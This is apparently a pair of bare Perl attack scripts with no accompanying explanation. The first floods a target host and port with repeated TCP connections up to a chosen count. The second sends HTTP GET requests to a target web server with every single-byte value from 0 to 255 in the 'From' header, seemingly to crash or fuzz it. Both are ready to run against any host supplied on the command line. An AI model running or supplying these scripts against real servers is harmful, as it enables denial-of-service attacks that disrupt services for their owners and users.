#!/usr/bin/perl
use IO::Socket;


        $ip     = $ARGV[0];
        $port   = $ARGV[1];
        $conn   = $ARGV[2];

        $num    = 0;


        while ( $num <= $conn ) {
                system("echo -n .");
                $s = IO::Socket::INET->new(Proto => "tcp", PeerAddr =>
"$ip", PeerPort => "$port") || die "[-] Connection FAILED!\n";

        close($s);
        $num++;
        }


#!/usr/bin/perl
use Net::HTTP;

        if (@ARGV < 1) {
                usage();
        }


        $host = @ARGV[0];
        $port = @ARGV[1];
        $num  = 0;

        print "[+] Sending request...\n";


        while ($num <= 255) {
                my $s = Net::HTTP->new(Host => $host, HTTPVersion => "1.0") || die $@;
                $s->write_request(GET => "/", 'User-Agent' => "Mozilla/5.0",
                                              'From' => chr($num));

                $num++;
                close($s);
        }

        print "\n[+] Done!\n";

sub usage() {
        print "[-] Usage: <". $0 ."> <host> <port>\n";
        print "[-] Example: ". $0 ." 127.0.0.1 80\n";
        exit;
}
